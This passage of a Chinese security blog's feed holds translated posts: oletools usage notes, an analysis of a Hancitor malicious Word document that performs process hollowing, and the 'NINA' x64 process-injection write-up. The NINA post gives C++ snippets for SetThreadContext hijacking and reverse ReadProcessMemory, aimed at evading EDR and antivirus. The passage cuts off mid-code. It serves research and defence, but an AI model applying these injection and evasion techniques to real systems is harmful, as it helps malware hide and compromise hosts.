DIAN_caso-5415.doc 这个恶意样本检测</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">oletimes DIAN_caso-5415.doc</span></span><br><span class="line">+----------------------------+---------------------+---------------------+</span><br><span class="line">| Stream/Storage name        | Modification Time   | Creation Time       |</span><br><span class="line">+----------------------------+---------------------+---------------------+</span><br><span class="line">| Root                       | 2014-05-14 12:45:24 | None                |</span><br><span class="line">| &#x27;\x01CompObj&#x27;              | None                | None                |</span><br><span class="line">| &#x27;\x05DocumentSummaryInform | None                | None                |</span><br><span class="line">| ation&#x27;                     |                     |                     |</span><br><span class="line">| &#x27;\x05SummaryInformation&#x27;   | None                | None                |</span><br><span class="line">| &#x27;1Table&#x27;                   | None                | None                |</span><br><span class="line">| &#x27;Data&#x27;                     | None                | None                |</span><br><span class="line">| &#x27;Macros&#x27;                   | 2014-05-14 12:45:24 | 2014-05-14 12:45:24 |</span><br><span class="line">| &#x27;Macros/PROJECT&#x27;           | None                | None                |</span><br><span class="line">| &#x27;Macros/PROJECTwm&#x27;         | None                | None                |</span><br><span class="line">| &#x27;Macros/VBA&#x27;               | 2014-05-14 12:45:24 | 2014-05-14 12:45:24 |</span><br><span class="line">| &#x27;Macros/VBA/ThisDocument&#x27;  | None                | None                |</span><br><span class="line">| &#x27;Macros/VBA/_VBA_PROJECT&#x27;  | None                | None                |</span><br><span class="line">| &#x27;Macros/VBA/__SRP_0&#x27;       | None                | None                |</span><br><span class="line">| &#x27;Macros/VBA/__SRP_1&#x27;       | None                | None                |</span><br><span class="line">| &#x27;Macros/VBA/__SRP_2&#x27;       | None                | None                |</span><br><span class="line">| &#x27;Macros/VBA/__SRP_3&#x27;       | None                | None                |</span><br><span class="line">| &#x27;Macros/VBA/dir&#x27;           | None                | None                |</span><br><span class="line">| &#x27;WordDocument&#x27;             | None                | None                |</span><br><span class="line">+----------------------------+---------------------+---------------------+</span><br></pre></td></tr></table></figure><h3 id="在-Python-应用程序中如何使用-oletimes"><a href="#在-Python-应用程序中如何使用-oletimes" class="headerlink" title="在 Python 应用程序中如何使用 oletimes"></a>在 Python 应用程序中如何使用 oletimes</h3><p>TODO</p><h2 id="oledir"><a href="#oledir" class="headerlink" title="oledir"></a>oledir</h2><p>oledir 可用于显示 OLE 文件的所有目录条目，包括空闲和孤立的条目。它既可以用作命令行工具，也可以用作你自己的应用程序中的 python 模块。</p><h3 id="使用方法-10"><a href="#使用方法-10" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Usage: oledir [options] &lt;filename&gt; [filename2 ...]</span><br><span class="line">Options:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -r                    find files recursively in subdirectories.</span><br><span class="line">  -z ZIP_PASSWORD, --zip=ZIP_PASSWORD</span><br><span class="line">                        if the file is a zip archive, open all files from it,</span><br><span class="line">                        using the provided password (requires Python 2.6+)</span><br><span class="line">  -f ZIP_FNAME, --zipfname=ZIP_FNAME</span><br><span class="line">                        if the file is a zip archive, file(s) to be opened</span><br><span class="line">                        within the zip. Wildcards * and ? are supported.</span><br><span class="line">                        (default:*)</span><br></pre></td></tr></table></figure><h3 id="一些粟子-4"><a href="#一些粟子-4" class="headerlink" title="一些粟子"></a>一些粟子</h3><p>扫描单个文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oledir file.doc</span><br></pre></td></tr></table></figure><p><img src="https://image.zeronohacker.com/article/2020/09/08/703acddb3d4ea55e05404776dd1f633d.png" alt=""></p><h3 id="在-Python-应用程序中如何使用-oledir"><a href="#在-Python-应用程序中如何使用-oledir" class="headerlink" title="在 Python 应用程序中如何使用 oledir"></a>在 Python 应用程序中如何使用 oledir</h3><p>TODO</p><h2 id="olemap"><a href="#olemap" class="headerlink" title="olemap"></a>olemap</h2><p>以 map 的形式显示 OLE 文件中的区域，它既可以用作命令行工具，也可以用作你自己的应用程序中的 python 模块。</p><h3 id="使用方法-11"><a href="#使用方法-11" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Usage: olemap &lt;filename&gt;</span><br></pre></td></tr></table></figure><h3 id="一些粟子-5"><a href="#一些粟子-5" class="headerlink" title="一些粟子"></a>一些粟子</h3><p>扫描单个文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">olemap file.doc</span><br></pre></td></tr></table></figure><p><img src="https://image.zeronohacker.com/article/2020/09/08/d6e40951c32ba677eec3455338d68ac6.png" alt=""></p><p><img src="https://image.zeronohacker.com/article/2020/09/08/aa5dea1e23fbf5ed354c5fd4a47d5d9d.png" alt=""></p><h3 id="在-Python-应用程序中如何使用-olemap"><a href="#在-Python-应用程序中如何使用-olemap" class="headerlink" title="在 Python 应用程序中如何使用 olemap"></a>在 Python 应用程序中如何使用 olemap</h3><p>TODO</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本文为 oletools 文档的中文版，原文链接：&lt;a href=&quot;https://github.com/decalage2/oletools/wiki&quot;&gt;https://github.com/decalage2/oletools/wiki&lt;/a&gt;</summary>
      
    
    
    
    <category term="工具源码" scheme="https://zeronohacker.github.io/categories/%E5%B7%A5%E5%85%B7%E6%BA%90%E7%A0%81/"/>
    
    
    <category term="oletools" scheme="https://zeronohacker.github.io/tags/oletools/"/>
    
    <category term="office" scheme="https://zeronohacker.github.io/tags/office/"/>
    
    <category term="OLE2" scheme="https://zeronohacker.github.io/tags/OLE2/"/>
    
  </entry>
  
  <entry>
    <title>恶意文档使用 Windows API 进行 Process hollowing</title>
    <link href="https://zeronohacker.github.io/2020/08/31/maldoc-uses-windows-api-to-perform-process-hollowing/"/>
    <id>https://zeronohacker.github.io/2020/08/31/maldoc-uses-windows-api-to-perform-process-hollowing/</id>
    <published>2020-08-31T11:20:24.000Z</published>
    <updated>2021-09-19T11:39:41.814Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文翻译自: <a href="https://0xevilc0de.com/maldoc-uses-windows-api-to-perform-process-hollowing/">https://0xevilc0de.com/maldoc-uses-windows-api-to-perform-process-hollowing/</a></p></blockquote><h2 id="前述"><a href="#前述" class="headerlink" title="前述"></a>前述</h2><p>恶意软件作者通常喜欢在 Office 文档中使用宏技术来替换系统中正常可执文件中的代码，这种技术称之为 Process hollowing。这篇文章的主要目的是识别这种技术并了解其使用方法，我还在 YouTube 上发布了一段 <a href="https://youtu.be/JE6QCS6no1Y">视频</a>，这段视频介绍了如何使用 Ghidra 进行 shellcode 分析。</p><p><img src="https://image.zeronohacker.com/article/2020/08/31/644d849e0e0bbe79e8fb36abd725d49e.png" alt=""></p><h2 id="让我们从宏开始"><a href="#让我们从宏开始" class="headerlink" title="让我们从宏开始"></a>让我们从宏开始</h2><p>首先，需检查宏以查看代码是从何处开始执行，在这个文档中，是以 <span class='p red'>Document_Open</span> 函数开始，这个可以在 ThisDocument 流中找到。</p><p><img src="https://image.zeronohacker.com/article/2020/08/31/fcf475b1cd5ded14ae5a1895575b2492.png" alt=""></p><p>此 Office 文档中存在大量混淆，使用 shellcode 进行 process hollowing，让我们来看下此 shellcode 在内存中的位置。</p><p>此文档中有两个流，一个是 ThisDocument，另一个是 Cowkeeper。在 Cowkeeper 流开始的部分，你会发现一些别名，这些别名最终用于进行 Windows API 调用。在这些函数中，<strong>VirtualAllocEx</strong> 和 <strong>RtlMoveMemory</strong> 可能用于内存分配，将 shellcode 复制到此处，如果你不熟悉这些 API 中的其中一个，则值得在 <a href="https://docs.microsoft.com/en-us/">MSDN</a> 上花上一些时间来研究它们。</p><p><img src="https://image.zeronohacker.com/article/2020/08/31/e16eadb5a2b84e1c3829cff9c345055b.png" alt=""></p><p>让我们跟踪这些文件使用的位置，请记住，在 VBA 中是使用别名。让我们从 betterment 开始，因为恶意文档需要内存才能将 shellcode 转入其中，betterment 是在 foam 里调用。</p><p><img src="https://image.zeronohacker.com/article/2020/08/31/532d3a4d63afbc4a2cc58fca8a6cd960.png" alt=""></p><p>betterment 或 <strong>VirtualAllowEx</strong> 将返回一个指向新分配内存的指针，值赋给了 diener，除此之外，还使用了 <strong>RtlMoveMemory</strong> 或 antecedency，下一步是找到该函数的调用位置，这个在 ThisDocument 流中 foam 调用里找到。</p><p>当你通过 bayberry 变量跟踪返回值时，你会看到在一个简单的加法中使用了它，bayberry + anklet，相加后的值，赋值给了 aprum，并用作名为 cabriolet 函数的参数。如果回顾我们前面分析过的所有别名，你会发现这个针对函数 EnumDateFormatsW，如何使用它来执行 shellcode 呢？</p><p>在 MSDN 上查询这个函数，第一个参数 ( 新分配的内存 ) 需要一个指向应用程序定义的回调函数的指针！</p><p><img src="https://image.zeronohacker.com/article/2020/08/31/bd334e2eb48ff9e9019869c3f60cd41c.png" alt=""></p><p>最后要弄清的是在它被调用之前添加到地址基址的内容，这可能是 shellcode 的偏移量，这对于正确理解反汇编代码非常重要 ( 这实际上定义了入口点 )。 你可以继续跟踪宏以查看该值是什么，或者可以使用 Office IDE 设置断点并动态检查这些值，两者都是可行的选择。在这里我将使用动态分析。 如果在对 Cabriolet 的调用上设置断点，则将阻止其执行，并允许你查看参数的值。</p><p><img src="https://image.zeronohacker.com/article/2020/08/31/c0cab1f45b4c49d792e9a65be2826d89.png" alt=""></p><p>aprum 的十六进制值为 ( 在这种情况下，这个地址值会发生变化 )：</p><p><img src="https://image.zeronohacker.com/article/2020/08/31/41b76d0389bc7667951e592da4618be6.png" alt=""></p><p>使用 Process Hacker 2 来查看进程的内存，RWX 的基址位于 0x70D0000 处，那也就意味着偏移为 0xE5D。</p><p><img src="https://image.zeronohacker.com/article/2020/08/31/8113ff70f13cb2a3741ac8648ad0e87c.png" alt=""></p><p>下面就为这段 shellcode：</p><p><img src="https://image.zeronohacker.com/article/2020/08/31/e9f9ece0f54b7864a57857ea1dc58fd9.png" alt=""></p><h2 id="分析-shellcode"><a href="#分析-shellcode" class="headerlink" title="分析 shellcode"></a>分析 shellcode</h2><p>提取 shellcode 代码后，对此进行反汇编，这样才能对它进行分析。你可以先将此 shellcode 加载到反汇编程序中，本文使用的是 Ghidra，一旦加载分析了 shellcode 代码，请转到偏移为 0xE5D 定义的函数处。</p><p><img src="https://image.zeronohacker.com/article/2020/08/31/acf2882c86ed15e7d1a9f1d71d515b84.png" alt=""></p><p>由于这是 shellcode，因此需要它自身的导入表结构。通常在程序加载过程中，操作系统会为该程序处理该操作，因为 shellcode 不会自行完成正常的加载过程。在检查代码时，你会注意到十六进制值序列被移到堆栈中：</p><p><img src="https://image.zeronohacker.com/article/2020/08/31/4670041c9cb5d9afaebc2d96bb8f7847.png" alt=""></p><p>你还会注意到在此一串值后面调用了 sub_cf1。第一个用到称为 stack-strings 的技术，程序正在构建需要解析的 API 的 ASCII 字符串。如果右键单击每个十六进制值，则可以将显示更改为字符常量。</p><p>有意义的是，每当使用这些字符串时，都必须具有解决这些函数的能力。在大多数的 shellcode 中，stack strings 之后都会调用 sub_cf1。你可以通过执行动态分析来确认这一点，在对 sub_cf1 的调用上 ( 或之后 ) 设置断点，并检查 EAX 寄存器的内容，它应为字符串中函数的指针。</p><p>当然，遍历二进制文件并更改所有这些类型可能是乏味的，由于 Ghidra 具有插件框架，因此你可以通过此类插件来使这项工作自动化。值得花一些时间搜索现有的插件，也许已经存在！提示，你可以在 <a href="https://github.com/0x6d696368/ghidra_scripts/blob/master/SearchSimpleStackStrings.py">这里</a> 找到一个。</p><p>如果你想了解如何解析函数地址，可以花一些时间来分析 sub_cf1。但是，我们的重点是找到 process hollowing 技术，包括以下API：</p><ul><li>CreateProcess</li><li>ZwUnmapViewOfSection</li><li>VirtualAlloc</li><li>WriteProcessMemory</li><li>GetThreadContext</li><li>SetThreadContext</li><li>ResumeThread</li></ul><p>一旦能够识别这些字符串，就可以在 shellcode 中跟踪如何以及何时使用它们。其中大多数在偏移 0x11d5 处。</p><p><img src="https://image.zeronohacker.com/article/2020/08/31/8204c83e69e72f62dae1d391b23ba185.png" alt=""></p><p>CreateProcess 将所需的 EXE 加载到内存中，其中一个参数将是 EXE 的路径，另一个将是在挂起状态下创建进程。以挂起状态启动会阻止进程开始执行。 ZwUnmapViewOfSection 将用于删除所选二进制文件的原始 TEXT 部分，这使 shellcode 可以调用 VirtualAlloc 分配新的内存，并与 WriteProcessMemory 一起将新的代码复制到进程中。从那里，它将调用 GetThreadContext 并使用返回的值更新新代码的入口点。最后的步骤是调用 SetThreadContext 和 ResumeThread。现在看来，SVCHOST 的一个实例正在 System32 目录中运行，但是实际的代码已被替换！</p><h2 id="样本信息"><a href="#样本信息" class="headerlink" title="样本信息"></a>样本信息</h2><p>Tria.ge：<a href="https://tria.ge/reports/200317-pt9rcrh1l2/behavioral1">https://tria.ge/reports/200317-pt9rcrh1l2/behavioral1</a></p><p>shellcode：<a href="https://github.com/jstrosch/malware-samples/tree/master/maldocs/hancitor/2016/October">https://github.com/jstrosch/malware-samples/tree/master/maldocs/hancitor/2016/October</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本文翻译自: &lt;a href=&quot;https://0xevilc0de.com/maldoc-uses-windows-api-to-perform-process-hollowing/&quot;&gt;https://0xevilc0de.com/maldoc-</summary>
      
    
    
    
    <category term="安全技术" scheme="https://zeronohacker.github.io/categories/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="Process hollowing" scheme="https://zeronohacker.github.io/tags/Process-hollowing/"/>
    
  </entry>
  
  <entry>
    <title>x64 进程注入技术 —— NINA</title>
    <link href="https://zeronohacker.github.io/2020/06/05/nina-x64-process-injection/"/>
    <id>https://zeronohacker.github.io/2020/06/05/nina-x64-process-injection/</id>
    <published>2020-06-05T10:04:25.000Z</published>
    <updated>2021-09-19T11:17:39.408Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文翻译自：<a href="https://undev.ninja/nina-x64-process-injection/">https://undev.ninja/nina-x64-process-injection/</a></p></blockquote><h2 id="前述"><a href="#前述" class="headerlink" title="前述"></a>前述</h2><p>在本文中，我将详细介绍一种实验性的进程注入技术，其中对比较通用的和“危险”函数使用施加了严格的限制，即 <strong>WriteProcessMemory，VirtualAllocEx，VirtualProtectEx，CreateRemoteThread，NtCreateThreadEx，QueueUserApc 和 NtQueueApcThread</strong>。 我称这种技术为 NINA：No Injection，No Allocation。 该技术的目的是为了通过减少可疑的 call 数量而不需要复杂的 ROP 链进而达到更加的隐蔽效果。 PoC 可以在这里找到：</p><p><a href="https://github.com/NtRaiseHardError/NINA">https://github.com/NtRaiseHardError/NINA</a></p><p>测试环境：</p><ul><li>Windows 10 x64 version 2004</li><li>Windows 10 x64 version 1903</li></ul><h2 id="实现-No-Injection"><a href="#实现-No-Injection" class="headerlink" title="实现 No Injection"></a>实现 No Injection</h2><p>让我们从移除需要注入的数据这种情况开始。最基本的进程注入所需要的操作：</p><ul><li>包含 payload 的目标地址；</li><li>将 payload 传递给目标进程；</li><li>执行操作以执行 payload；</li></ul><p>为了将重点放在 No Injection 部分，我将使用经典的 VirtualAllocEx 在远程进程中分配内存。 重要的是要防止页面同时具有写和执行权限，因此应首先设置 RW，然后在写入数据后用 RX 重新保护。 由于我稍后将讨论 No Allocation 方法，因此我们现在可以将页面设置为 RWX，以使事情变得简单。</p><p>如果我们限制自己不使用数据注入，则意味着恶意进程不会使用 WriteProcessMemory 将数据直接从自身传输到目标进程。 为了解决这个问题，我受到Deep Instinct（复杂）“Inject Me”进程注入技术（由 @slaeryan 分享）记录的反向 ReadProcessMemory 的启发。 还有其他将数据传递到进程的方法：使用 GlobalGetAtomName（来自 Atom Bombing 技术），以及通过命令行选项或环境变量传递数据（使用 CreateProcess 调用来生成目标进程）。 但是，这三种方法有一个小的限制，那就是 payload 不得包含 NULL 字符。 Ghost Writing 也许是一种选择，但它需要复杂的 ROP 链。</p><p>为了得到执行，我选择了 SetThreadContext 函数的线程劫持技术，因为我们不能使用 <strong>CreateRemoteThread，NtCreateThreadEx，QueueUserApc 和 NtQueueApcThread</strong>。</p><p>下面是大体的一个过程：</p><ul><li>CreateProcess 生成目标进程；</li><li>VirtualAllocEx 为 payload 和堆栈分配内存；</li><li>SetThreadContext 强制目标进程执行 ReadProcessMemory；</li><li>SetThreadContext 执行 payload；</li></ul><h3 id="CreateProcess"><a href="#CreateProcess" class="headerlink" title="CreateProcess"></a>CreateProcess</h3><p>使用这种注入技术时应考虑一些注意事项。 第一个是来自 CreateProcess 的调用。 尽管此技术不依赖于 CreateProcess，但出于某些原因，使用它代替诸如 OpenProcess 或 OpenThread 之类的方法可能更有利。 原因之一是，没有远程（外部）进程访问权限来获取句柄，否则这些句柄可能会被使用ObRegisterCallbacks 的监视工具（例如 Sysmon）检测到。 另一个原因是，它允许使用命令行和环境变量进行上述两种数据注入方法。 如果您正在创建进程，则还可以利用 <a href="https://blog.xpnsec.com/protecting-your-malware/">blockdll 和 ACG</a> 来击败防病毒用户模式下 HOOK。</p><h3 id="VirtualAllocEx"><a href="#VirtualAllocEx" class="headerlink" title="VirtualAllocEx"></a>VirtualAllocEx</h3><p>当然，目标进程需要能够容纳 payload，但是此技术还需要堆栈。 这将很快阐明。</p><h3 id="ReadProcessMemory"><a href="#ReadProcessMemory" class="headerlink" title="ReadProcessMemory"></a>ReadProcessMemory</h3><p>要以相反的方式使用此功能，我们必须考虑两个问题：在堆栈上传递 5 个参数，并对我们自己的恶意进程使用有效的进程句柄。 让我们先来看第 5 个参数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">ReadProcessMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  HANDLE  hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">  LPCVOID lpBaseAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">  LPVOID  lpBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  SIZE_T  nSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  SIZE_T  *lpNumberOfBytesRead</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>使用 SetThreadContext 仅允许在 x64 上使用前四个参数。 如果我们阅读 lpNumberOfBytesRead 的描述，我们可以看到它是可选的：</p><div class="tip "><p>指向变量的指针，该变量接收传输到指定缓冲区的字节数， 如果 lpNumberOfBytesRead 为 NULL，则忽略该参数。</p></div><p>幸运的是，如果我们使用 VirtualAllocEx 创建页面，该函数会将它们归 0：</p><div class="tip "><p>在指定进程的虚拟地址空间内保留，提交或更改内存区域的状态， 该函数将其分配的内存初始化为 0。</p></div><p>将堆栈设置为 0 分配的页面将使得第 5 个参数有效。</p><p>第二个问题是传递给 ReadProcessMemory 的进程句柄。 因为我们正试图让目标进程读取我们的恶意进程，所以我们需要为其提供处理程序的句柄。 这可以使用 DuplicateHandle 函数来实现。 它会被赋予我们当前进程句柄，并返回一个可以被目标进程使用的句柄。</p><h3 id="SetThreadContext"><a href="#SetThreadContext" class="headerlink" title="SetThreadContext"></a>SetThreadContext</h3><p>SetThreadContext 是强大而灵活的功能，它允许读取，写入和执行。 但是，使用它传递 fastcall 参数存在一个已知问题：易失性寄存器 RCX，RDX，R8 和 R9 无法可靠地设置为所需值。考虑以下代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Get target process to read shellcode</span></span><br><span class="line"><span class="built_in">SetExecutionContext</span>(</span><br><span class="line">    <span class="comment">// Target thread</span></span><br><span class="line">    &amp;TargetThread,</span><br><span class="line">    <span class="comment">// Set RIP to read our shellcode</span></span><br><span class="line">    _ReadProcessMemory,</span><br><span class="line">    <span class="comment">// RSP points to stack</span></span><br><span class="line">    StackLocation,</span><br><span class="line">    <span class="comment">// RCX: Handle to our own process to read shellcode</span></span><br><span class="line">    TargetProcess,</span><br><span class="line">    <span class="comment">// RDX: Address to read from</span></span><br><span class="line">    &amp;Shellcode,</span><br><span class="line">    <span class="comment">// R8: Buffer to store shellcode</span></span><br><span class="line">    TargetBuffer,</span><br><span class="line">    <span class="comment">// R9: Size to read</span></span><br><span class="line">    <span class="built_in"><span class="keyword">sizeof</span></span>(Shellcode)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>如果执行此代码，我们期望当目标线程到达 ReadProcessMemory 时，易失性寄存器将保持其正确的值。但是，这不是实际发生的情况：</p><p><img src="https://image.zeronohacker.com/article/2020/06/05/CA9DFE2D9145CECD6F71BB5D689CDEF4.png" alt=""></p><p>由于某些未知的原因，易失性寄存器被更改，使该技术无法使用。 RCX 不是进程的有效句柄，RDX 为 0，R9 太大。 我发现一种方法可以可靠地设置易失性寄存器：在使用 SetThreadContext 之前，只需将 RIP 设置为无限 jmp -2 循环即可。 让我们来看看它的作用：</p><p><img src="https://image.zeronohacker.com/article/2020/06/05/7BAF12FF23B954527B4D2C75D76C46EF.png" alt=""></p><p>可以使用 SetThreadContext 执行无限循环，然后可以使用正确的易失性寄存器调用 ReadProcessMemory：</p><p><img src="https://image.zeronohacker.com/article/2020/06/05/A6000B5907CB4BE65EB45AB86CF3F805.png" alt=""></p><p>现在我们需要处理返回。 请注意，我们已分配并转至我们自己的堆栈。 如果我们可以使用 ReadProcessMemory 将 Shellcode 读入 RSP 的堆栈位置，则可以设置 Shellcode 的前 8 个字节，以便它重新回到自身。 这是一个例子：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BYTE Shellcode[] = &#123;</span><br><span class="line">    <span class="comment">// Placeholder for ret from ReadProcessMemory to Shellcode + 8</span></span><br><span class="line">    <span class="number">0xEF</span>, <span class="number">0xBE</span>, <span class="number">0xAD</span>, <span class="number">0xDE</span>, <span class="number">0xEF</span>, <span class="number">0xBE</span>, <span class="number">0xAD</span>, <span class="number">0xDE</span>,</span><br><span class="line">    <span class="comment">// Shellcode starts here...</span></span><br><span class="line">    <span class="number">0xEB</span>, <span class="number">0xFE</span>, <span class="number">0x01</span>, <span class="number">0x23</span>, <span class="number">0x45</span>, <span class="number">0x67</span>, <span class="number">0x89</span>, <span class="number">0xAA</span>,</span><br><span class="line">    <span class="number">0xBB</span>, <span class="number">0xCC</span>, <span class="number">0xDD</span>, <span class="number">0xEE</span>, <span class="number">0xFF</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://image.zeronohacker.com/article/2020/06/05/420994740F05B40711840E38FCA670AA.png" alt=""></p><p>RSP 和 R8 指向 000001F457C21000。 向上的地址将用于 ReadProcessMemory 调用中的堆栈。 将要写入 Shellcode 的目标缓冲区从 R8 向下。 当 ReadProcessMemory 返回时，它将使用 shellcode 的前 8 个字节作为实际 shellcode 起始处的 000001F457C21008 的返回地址：</p><p><img src="https://image.zeronohacker.com/article/2020/06/05/39788EDE3F4EA6FFEF7F7CFF5C75109B.png" alt=""></p><h2 id="实现：No-Allocation"><a href="#实现：No-Allocation" class="headerlink" title="实现：No Allocation"></a>实现：No Allocation</h2><p>现在让我们讨论如何通过移除对 VirtualAllocEx 的依赖来进行改进。 这与上一节相比并不那么琐碎，因为会出现一些初始问题：</p><ul><li>我们如何为 ReadProcessMemory 设置堆栈</li><li>如果没有 RWX 节，如何使用 ReadProcessMemory 编写和执行 Shellcode</li></ul><p>但是，为什么要在已经可以使用的内存中分配内存呢？ 请记住，如果内存中的任何现有页面都受到影响，则应注意不要覆盖任何关键数据（如果应恢复原始执行流程）。</p><h3 id="堆栈"><a href="#堆栈" class="headerlink" title="堆栈"></a>堆栈</h3><p>如果我们无法为堆栈分配内存，则可以找到一个空白的 RW 页面来使用。如果担心 ReadProcessMemory 的第 5 个参数为 NULL，则可以轻松解决。 如果我们不想覆盖潜在的关键数据，则可以利用可执行映像内可能的 RW 页面内的节填充。 当然，这假定存在可用的填充。</p><p>要在可执行映像的内存范围内定位 RW 页面，我们可以通过进程环境块（PEB）定位映像的基址，然后使用 VirtualQueryEx 枚举范围。 此函数将返回诸如保护及其大小之类的信息，这些信息可用于查找任何现有的 RW 页面，以及它们的大小是否适合 Shellcode。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Get PEB.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="built_in">NtQueryInformationProcess</span>(</span><br><span class="line">    ProcessHandle,</span><br><span class="line">    ProcessBasicInformation,</span><br><span class="line">    &amp;ProcessBasicInfo,</span><br><span class="line">    <span class="built_in"><span class="keyword">sizeof</span></span>(PROCESS_BASIC_INFORMATION),</span><br><span class="line">    &amp;ReturnLength</span><br><span class="line">);</span><br><span class="line">    </span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Get image base.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="built_in">ReadProcessMemory</span>(</span><br><span class="line">    ProcessHandle,</span><br><span class="line">    ProcessBasicInfo.PebBaseAddress,</span><br><span class="line">    &amp;Peb,</span><br><span class="line">    <span class="built_in"><span class="keyword">sizeof</span></span>(PEB),</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line">    ImageBaseAddress = Peb.Reserved3[<span class="number">1</span>];</span><br><span class="line">    </span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Get DOS header.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="built_in">ReadProcessMemory</span>(</span><br><span class="line">    ProcessHandle,</span><br><span class="line">    ImageBaseAddress,</span><br><span class="line">    &amp;DosHeader,</span><br><span class="line">    <span class="built_in"><span class="keyword">sizeof</span></span>(IMAGE_DOS_HEADER),</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line">    </span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Get NT headers.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="built_in">ReadProcessMemory</span>(</span><br><span class="line">    ProcessHandle,</span><br><span class="line">    (LPBYTE)ImageBaseAddress + DosHeader.e_lfanew,</span><br><span class="line">    &amp;NtHeaders,</span><br><span class="line">    <span class="built_in"><span class="keyword">sizeof</span></span>(IMAGE_NT_HEADERS),</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line">    </span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span 